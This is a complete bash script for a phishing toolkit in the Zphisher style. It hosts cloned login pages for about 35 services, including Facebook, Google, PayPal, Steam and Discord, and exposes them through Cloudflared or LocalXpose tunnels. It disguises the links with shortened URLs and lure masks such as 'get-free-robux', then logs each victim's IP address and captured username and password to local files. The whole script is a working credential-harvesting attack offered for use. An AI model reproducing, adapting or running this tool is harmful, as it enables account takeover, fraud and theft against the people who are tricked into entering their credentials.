#!/bin/bash

__version__="2.0.0"

HOST='127.0.0.1'
PORT='8080' 

RED="$(printf '\033[31m')"  RED="$(printf '\033[31m')"  RED="$(printf '\033[31m')"  RED="$(printf '\033[31m')"
RED="$(printf '\033[31m')"  RED="$(printf '\033[31m')"  RED="$(printf '\033[31m')" RED="$(printf '\033[31m')"
REDBG="$(printf '\033[41m')"  REDBG="$(printf '\033[41m')"  REDBG="$(printf '\033[41m')"  REDBG="$(printf '\033[41m')"
REDBG="$(printf '\033[41m')"  REDBG="$(printf '\033[41m')"  REDBG="$(printf '\033[41m')" REDBG="$(printf '\033[41m')"
RESETBG="$(printf '\e[0m\n')"

BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi

if [[ ! -d "auth" ]]; then
	mkdir -p "auth"
fi

if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi

if [[ -e ".server/.loclx" ]]; then
	rm -rf ".server/.loclx"
fi

if [[ -e ".server/.cld.log" ]]; then
	rm -rf ".server/.cld.log"
fi

exit_on_signal_SIGINT() {
	{ printf "\n\n%s\n\n" "${RED}[${RED}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
	exit 0
}

exit_on_signal_SIGTERM() {
	{ printf "\n\n%s\n\n" "${RED}[${RED}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
	exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

reset_color() {
	tput sgr0
	tput op
	return
}

kill_pid() {
	check_PID="php cloudflared loclx"
	for process in ${check_PID}; do
		if [[ $(pidof ${process}) ]]; then
			killall ${process} > /dev/null 2>&1
		fi
	done
}

check_status() {
	echo -ne "\n${RED}[${RED}+${RED}]${RED} Internet Status : "
	timeout 3s curl -fIs "https://api.github.com" > /dev/null
	[ $? -eq 0 ] && echo -e "${RED}Online${RED}" || echo -e "${RED}Offline${RED}"
}

banner() {
	cat <<- EOF
		${RED}
		${RED} ░█ ▀▄▀ █▀█ █░█ █ █▀ █░█
${RED} ▄█ █░█ █▀▀ █▀█ █ ▄█ █▀█         
        ${RED}Version : ${__version__}

		${RED}[${RED}-${RED}]${RED} By Jx Official! ${RED}
	EOF
}

banner_small() {
	cat <<- EOF
		${RED}
		${RED}  
        ${RED} ░█ ▀▄▀ █▀█ █░█ █ █▀ █░█
        ${RED} ▄█ █░█ █▀▀ █▀█ █ ▄█ █▀█
        ${RED} ${__version__}
	EOF
}

dependencies() {
	echo -e "\n${RED}[${RED}+${RED}]${RED} Installing required packages..."

	if [[ -d "/data/data/com.termux/files/home" ]]; then
		if [[ ! $(command -v proot) ]]; then
			echo -e "\n${RED}[${RED}+${RED}]${RED} Installing package : ${RED}proot${RED}"${RED}
			pkg install proot resolv-conf -y
		fi

		if [[ ! $(command -v tput) ]]; then
			echo -e "\n${RED}[${RED}+${RED}]${RED} Installing package : ${RED}ncurses-utils${RED}"${RED}
			pkg install ncurses-utils -y
		fi
	fi

	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
		echo -e "\n${RED}[${RED}+${RED}]${RED} Packages already installed."
	else
		pkgs=(php curl unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${RED}[${RED}+${RED}]${RED} Installing package : ${RED}$pkg${RED}"${RED}
				if [[ $(command -v pkg) ]]; then
					pkg install "$pkg" -y
				elif [[ $(command -v apt) ]]; then
					sudo apt install "$pkg" -y
				elif [[ $(command -v apt-get) ]]; then
					sudo apt-get install "$pkg" -y
				elif [[ $(command -v pacman) ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ $(command -v dnf) ]]; then
					sudo dnf -y install "$pkg"
				elif [[ $(command -v yum) ]]; then
					sudo yum -y install "$pkg"
				else
					echo -e "\n${RED}[${RED}!${RED}]${RED} Unsupported package manager, Install packages manually."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi
}

download() {
	url="$1"
	output="$2"
	file=`basename $url`
	if [[ -e "$file" || -e "$output" ]]; then
		rm -rf "$file" "$output"
	fi
	curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"

	if [[ -e "$file" ]]; then
		if [[ ${file#*.} == "zip" ]]; then
			unzip -qq $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		elif [[ ${file#*.} == "tgz" ]]; then
			tar -zxf $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		else
			mv -f $file .server/$output > /dev/null 2>&1
		fi
		chmod +x .server/$output > /dev/null 2>&1
		rm -rf "$file"
	else
		echo -e "\n${RED}[${RED}!${RED}]${RED} Error occured while downloading ${output}."
		{ reset_color; exit 1; }
	fi
}

install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "\n${RED}[${RED}+${RED}]${RED} Cloudflared already installed."
	else
		echo -e "\n${RED}[${RED}+${RED}]${RED} Installing Cloudflared..."${RED}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
		else
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
		fi
	fi
}

install_localxpose() {
	if [[ -e ".server/loclx" ]]; then
		echo -e "\n${RED}[${RED}+${RED}]${RED} LocalXpose already installed."
	else
		echo -e "\n${RED}[${RED}+${RED}]${RED} Installing LocalXpose..."${RED}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
		else
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
		fi
	fi
}

msg_exit() {
	{ clear; banner; echo; }
	echo -e "${REDBG}${RED} Thank you for using this tool. Have a good day.${RESETBG}\n"
	{ reset_color; exit 0; }
}

about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${RED} Author   ${RED}:  ${RED}BangJX  ${RED}Official
		${RED} Github   ${RED}:  ${RED}https://github.com/bgjx-off
		${RED} Cyber Team   ${RED}:  ${RED}http://jxtcyberteam.kesug.com
		${RED} Version  ${RED}:  ${RED}${__version__}

		${RED}[${RED}00${RED}]${RED} Main Menu     ${RED}[${RED}99${RED}]${RED} Exit

	EOF

	read -p "${RED}[${RED}-${RED}]${RED} Select an option : ${RED}"
	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			echo -ne "\n${RED}[${RED}+${RED}]${RED} Returning to main menu..."
			{ sleep 1; main_menu; };;
		*)
			echo -ne "\n${RED}[${RED}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; about; };;
	esac
}

cusport() {
	echo
	read -n1 -p "${RED}[${RED}?${RED}]${RED} Do You Want A Custom Port ${RED}[${RED}y${RED}/${RED}N${RED}]: ${RED}" P_ANS
	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
		echo -e "\n"
		read -n4 -p "${RED}[${RED}-${RED}]${RED} Enter Your Custom 4-digit Port [1024-9999] : ${RED}" CU_P
		if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
			PORT=${CU_P}
			echo
		else
			echo -ne "\n\n${RED}[${RED}!${RED}]${RED} Invalid 4-digit Port : $CU_P, Try Again...${RED}"
			{ sleep 2; clear; banner_small; cusport; }
		fi		
	else 
		echo -ne "\n\n${RED}[${RED}-${RED}]${RED} Using Default Port $PORT...${RED}\n"
	fi
}

setup_site() {
	echo -e "\n${RED}[${RED}-${RED}]${RED} Setting up server..."${RED}
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	echo -ne "\n${RED}[${RED}-${RED}]${RED} Starting PHP server..."${RED}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}

capture_ip() {
	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
	IFS=$'\n'
	echo -e "\n${RED}[${RED}-${RED}]${RED} Victim's IP : ${RED}$IP"
	echo -ne "\n${RED}[${RED}-${RED}]${RED} Saved in : ${RED}auth/ip.txt"
	cat .server/www/ip.txt >> auth/ip.txt
}

capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
	IFS=$'\n'
	echo -e "\n${RED}[${RED}-${RED}]${RED} Account : ${RED}$ACCOUNT"
	echo -e "\n${RED}[${RED}-${RED}]${RED} Password : ${RED}$PASSWORD"
	echo -e "\n${RED}[${RED}-${RED}]${RED} Saved in : ${RED}auth/usernames.dat"
	cat .server/www/usernames.txt >> auth/usernames.dat
	echo -ne "\n${RED}[${RED}-${RED}]${RED} Waiting for Next Login Info, ${RED}Ctrl + C ${RED}to exit. "
}

capture_data() {
	echo -ne "\n${RED}[${RED}-${RED}]${RED} Waiting for Login Info, ${RED}Ctrl + C ${RED}to exit..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${RED}[${RED}-${RED}]${RED} Victim IP Found !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${RED}[${RED}-${RED}]${RED} Login info Found !!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

start_cloudflared() { 
	rm .cld.log > /dev/null 2>&1 &
	cusport
	echo -e "\n${RED}[${RED}-${RED}]${RED} Initializing... ${RED}( ${RED}http://$HOST:$PORT ${RED})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${RED}-${RED}]${RED} Launching Cloudflared..."

	if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	else
		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	fi

	sleep 8
	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
	custom_url "$cldflr_url"
	capture_data
}

localxpose_auth() {
	./.server/loclx -help > /dev/null 2>&1 &
	sleep 1
	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 

	[ "$(./.server/loclx account status | grep Error)" ] && {
		echo -e "\n\n${RED}[${RED}!${RED}]${RED} Create an account on ${RED}localxpose.io${RED} & copy the token\n"
		sleep 3
		read -p "${RED}[${RED}-${RED}]${RED} Input Loclx Token :${RED} " loclx_token
		[[ $loclx_token == "" ]] && {
			echo -e "\n${RED}[${RED}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
		} || {
			echo -n "$loclx_token" > $auth_f 2> /dev/null
		}
	}
}

start_loclx() {
	cusport
	echo -e "\n${RED}[${RED}-${RED}]${RED} Initializing... ${RED}( ${RED}http://$HOST:$PORT ${RED})"
	{ sleep 1; setup_site; localxpose_auth; }
	echo -e "\n"
	read -n1 -p "${RED}[${RED}?${RED}]${RED} Change Loclx Server Region? ${RED}[${RED}y${RED}/${RED}N${RED}]:${RED} " opinion
	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
	echo -e "\n\n${RED}[${RED}-${RED}]${RED} Launching LocalXpose..."

	if [[ `command -v termux-chroot` ]]; then
		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
	else
		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
	fi

	sleep 12
	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
	custom_url "$loclx_url"
	capture_data
}

start_localhost() {
	cusport
	echo -e "\n${RED}[${RED}-${RED}]${RED} Initializing... ${RED}( ${RED}http://$HOST:$PORT ${RED})"
	setup_site
	{ sleep 1; clear; banner_small; }
	echo -e "\n${RED}[${RED}-${RED}]${RED} Successfully Hosted at : ${RED}${RED}http://$HOST:$PORT ${RED}"
	capture_data
}

tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF

		${RED}[${RED}01${RED}]${RED} Localhost
		${RED}[${RED}02${RED}]${RED} Cloudflared  
		${RED}[${RED}03${RED}]${RED} LocalXpose  

	EOF

	read -p "${RED}[${RED}-${RED}]${RED} Select a port forwarding service : ${RED}"

	case $REPLY in 
		1 | 01)
			start_localhost;;
		2 | 02)
			start_cloudflared;;
		3 | 03)
			start_loclx;;
		*)
			echo -ne "\n${RED}[${RED}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; tunnel_menu; };;
	esac
}

custom_mask() {
	{ sleep .5; clear; banner_small; echo; }
	read -n1 -p "${RED}[${RED}?${RED}]${RED} Do you want to change Mask URL? ${RED}[${RED}y${RED}/${RED}N${RED}] :${RED} " mask_op
	echo
	if [[ ${mask_op,,} == "y" ]]; then
		echo -e "\n${RED}[${RED}-${RED}]${RED} Enter your custom URL below ${RED}(${RED}Example: https://get-free-followers.com${RED})\n"
		read -e -p "${RED} ==> ${RED}" -i "https://" mask_url
		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
			mask=$mask_url
			echo -e "\n${RED}[${RED}-${RED}]${RED} Using custom Masked Url :${RED} $mask"
		else
			echo -e "\n${RED}[${RED}!${RED}]${RED} Invalid url type..Using the Default one.."
		fi
	fi
}

site_stat() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }

shorten() {
	short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
	if [[ "$1" == *"shrtco.de"* ]]; then
		processed_url=$(echo ${short} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
	else
		processed_url=${short#http*//}
	fi
}

custom_url() {
	url=${1#http*//}
	isgd="https://is.gd/create.php?format=simple&url="
	shortcode="https://api.shrtco.de/v2/shorten?url="
	tinyurl="https://tinyurl.com/api-create.php?url="

	{ custom_mask; sleep 1; clear; banner_small; }
	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
		if [[ $(site_stat $isgd) == 2* ]]; then
			shorten $isgd "$url"
		elif [[ $(site_stat $shortcode) == 2* ]]; then
			shorten $shortcode "$url"
		else
			shorten $tinyurl "$url"
		fi

		url="https://$url"
		masked_url="$mask@$processed_url"
		processed_url="https://$processed_url"
	else
		url="Unable to generate links. Try after turning on hotspot"
		processed_url="Unable to Short URL"
	fi

	echo -e "\n${RED}[${RED}-${RED}]${RED} URL 1 : ${RED}$url"
	echo -e "\n${RED}[${RED}-${RED}]${RED} URL 2 : ${RED}$processed_url"
	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${RED}-${RED}]${RED} URL 3 : ${RED}$masked_url"
}

site_facebook() {
	cat <<- EOF

		${RED}[${RED}01${RED}]${RED} Traditional Login Page
		${RED}[${RED}02${RED}]${RED} Advanced Voting Poll Login Page
		${RED}[${RED}03${RED}]${RED} Fake Security Login Page
		${RED}[${RED}04${RED}]${RED} Facebook Messenger Login Page

	EOF

	read -p "${RED}[${RED}-${RED}]${RED} Select an option : ${RED}"

	case $REPLY in 
		1 | 01)
			website="facebook"
			mask='https://blue-verified-badge-for-facebook-free'
			tunnel_menu;;
		2 | 02)
			website="fb_advanced"
			mask='https://vote-for-the-best-social-media'
			tunnel_menu;;
		3 | 03)
			website="fb_security"
			mask='https://make-your-facebook-secured-and-free-from-hackers'
			tunnel_menu;;
		4 | 04)
			website="fb_messenger"
			mask='https://get-messenger-premium-features-free'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${RED}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_facebook; };;
	esac
}

site_instagram() {
	cat <<- EOF

		${RED}[${RED}01${RED}]${RED} Traditional Login Page
		${RED}[${RED}02${RED}]${RED} Auto Followers Login Page
		${RED}[${RED}03${RED}]${RED} 1000 Followers Login Page
		${RED}[${RED}04${RED}]${RED} Blue Badge Verify Login Page

	EOF

	read -p "${RED}[${RED}-${RED}]${RED} Select an option : ${RED}"

	case $REPLY in 
		1 | 01)
			website="instagram"
			mask='https://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		2 | 02)
			website="ig_followers"
			mask='https://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		3 | 03)
			website="insta_followers"
			mask='https://get-1000-followers-for-instagram'
			tunnel_menu;;
		4 | 04)
			website="ig_verify"
			mask='https://blue-badge-verify-for-instagram-free'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${RED}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_instagram; };;
	esac
}

site_gmail() {
	cat <<- EOF

		${RED}[${RED}01${RED}]${RED} Gmail Old Login Page
		${RED}[${RED}02${RED}]${RED} Gmail New Login Page
		${RED}[${RED}03${RED}]${RED} Advanced Voting Poll

	EOF

	read -p "${RED}[${RED}-${RED}]${RED} Select an option : ${RED}"

	case $REPLY in 
		1 | 01)
			website="google"
			mask='https://get-unlimited-google-drive-free'
			tunnel_menu;;		
		2 | 02)
			website="google_new"
			mask='https://get-unlimited-google-drive-free'
			tunnel_menu;;
		3 | 03)
			website="google_poll"
			mask='https://vote-for-the-best-social-media'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${RED}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_gmail; };;
	esac
}

site_vk() {
	cat <<- EOF

		${RED}[${RED}01${RED}]${RED} Traditional Login Page
		${RED}[${RED}02${RED}]${RED} Advanced Voting Poll Login Page

	EOF

	read -p "${RED}[${RED}-${RED}]${RED} Select an option : ${RED}"

	case $REPLY in 
		1 | 01)
			website="vk"
			mask='https://vk-premium-real-method-2020'
			tunnel_menu;;
		2 | 02)
			website="vk_poll"
			mask='https://vote-for-the-best-social-media'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${RED}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_vk; };;
	esac
}

main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${RED}[${RED}::${RED}]${RED} Select An Attack For Your Victim ${RED}[${RED}::${RED}]${RED}

		${RED}[${RED}01${RED}]${RED} Facebook      ${RED}[${RED}11${RED}]${RED} Twitch       ${RED}[${RED}21${RED}]${RED} DeviantArt
		${RED}[${RED}02${RED}]${RED} Instagram     ${RED}[${RED}12${RED}]${RED} Pinterest    ${RED}[${RED}22${RED}]${RED} Badoo
		${RED}[${RED}03${RED}]${RED} Google        ${RED}[${RED}13${RED}]${RED} Snapchat     ${RED}[${RED}23${RED}]${RED} Origin
		${RED}[${RED}04${RED}]${RED} Microsoft     ${RED}[${RED}14${RED}]${RED} Linkedin     ${RED}[${RED}24${RED}]${RED} DropBox	
		${RED}[${RED}05${RED}]${RED} Netflix       ${RED}[${RED}15${RED}]${RED} Ebay         ${RED}[${RED}25${RED}]${RED} Yahoo		
		${RED}[${RED}06${RED}]${RED} Paypal        ${RED}[${RED}16${RED}]${RED} Quora        ${RED}[${RED}26${RED}]${RED} Wordpress
		${RED}[${RED}07${RED}]${RED} Steam         ${RED}[${RED}17${RED}]${RED} Protonmail   ${RED}[${RED}27${RED}]${RED} Yandex			
		${RED}[${RED}08${RED}]${RED} Twitter       ${RED}[${RED}18${RED}]${RED} Spotify      ${RED}[${RED}28${RED}]${RED} StackoverFlow
		${RED}[${RED}09${RED}]${RED} Playstation   ${RED}[${RED}19${RED}]${RED} Reddit       ${RED}[${RED}29${RED}]${RED} Vk
		${RED}[${RED}10${RED}]${RED} Tiktok        ${RED}[${RED}20${RED}]${RED} Adobe        ${RED}[${RED}30${RED}]${RED} XBOX
		${RED}[${RED}31${RED}]${RED} Mediafire     ${RED}[${RED}32${RED}]${RED} Gitlab       ${RED}[${RED}33${RED}]${RED} Github
		${RED}[${RED}34${RED}]${RED} Discord       ${RED}[${RED}35${RED}]${RED} Roblox 

		${RED}[${RED}99${RED}]${RED} About         ${RED}[${RED}00${RED}]${RED} Exit

	EOF
	
	read -p "${RED}[${RED}-${RED}]${RED} Select an option : ${RED}"

	case $REPLY in 
		1 | 01)
			site_facebook;;
		2 | 02)
			site_instagram;;
		3 | 03)
			site_gmail;;
		4 | 04)
			website="microsoft"
			mask='https://unlimited-onedrive-space-for-free'
			tunnel_menu;;
		5 | 05)
			website="netflix"
			mask='https://upgrade-your-netflix-plan-free'
			tunnel_menu;;
		6 | 06)
			website="paypal"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		7 | 07)
			website="steam"
			mask='https://steam-500-usd-gift-card-free'
			tunnel_menu;;
		8 | 08)
			website="twitter"
			mask='https://get-blue-badge-on-twitter-free'
			tunnel_menu;;
		9 | 09)
			website="playstation"
			mask='https://playstation-500-usd-gift-card-free'
			tunnel_menu;;
		10)
			website="tiktok"
			mask='https://tiktok-free-liker'
			tunnel_menu;;
		11)
			website="twitch"
			mask='https://unlimited-twitch-tv-user-for-free'
			tunnel_menu;;
		12)
			website="pinterest"
			mask='https://get-a-premium-plan-for-pinterest-free'
			tunnel_menu;;
		13)
			website="snapchat"
			mask='https://view-locked-snapchat-accounts-secretly'
			tunnel_menu;;
		14)
			website="linkedin"
			mask='https://get-a-premium-plan-for-linkedin-free'
			tunnel_menu;;
		15)
			website="ebay"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		16)
			website="quora"
			mask='https://quora-premium-for-free'
			tunnel_menu;;
		17)
			website="protonmail"
			mask='https://protonmail-pro-basics-for-free'
			tunnel_menu;;
		18)
			website="spotify"
			mask='https://convert-your-account-to-spotify-premium'
			tunnel_menu;;
		19)
			website="reddit"
			mask='https://reddit-official-verified-member-badge'
			tunnel_menu;;
		20)
			website="adobe"
			mask='https://get-adobe-lifetime-pro-membership-free'
			tunnel_menu;;
		21)
			website="deviantart"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		22)
			website="badoo"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		23)
			website="origin"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		24)
			website="dropbox"
			mask='https://get-1TB-cloud-storage-free'
			tunnel_menu;;
		25)
			website="yahoo"
			mask='https://grab-mail-from-anyother-yahoo-account-free'
			tunnel_menu;;
		26)
			website="wordpress"
			mask='https://unlimited-wordpress-traffic-free'
			tunnel_menu;;
		27)
			website="yandex"
			mask='https://grab-mail-from-anyother-yandex-account-free'
			tunnel_menu;;
		28)
			website="stackoverflow"
			mask='https://get-stackoverflow-lifetime-pro-membership-free'
			tunnel_menu;;
		29)
			site_vk;;
		30)
			website="xbox"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		31)
			website="mediafire"
			mask='https://get-1TB-on-mediafire-free'
			tunnel_menu;;
		32)
			website="gitlab"
			mask='https://get-1k-followers-on-gitlab-free'
			tunnel_menu;;
		33)
			website="github"
			mask='https://get-1k-followers-on-github-free'
			tunnel_menu;;
		34)
			website="discord"
			mask='https://get-discord-nitro-free'
			tunnel_menu;;
		35)
			website="roblox"
			mask='https://get-free-robux'
			tunnel_menu;;
		99)
			about;;
		0 | 00 )
			msg_exit;;
		*)
			echo -ne "\n${RED}[${RED}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; main_menu; };;
	
	esac
}

kill_pid
dependencies
check_status
install_cloudflared
install_localxpose
main_menu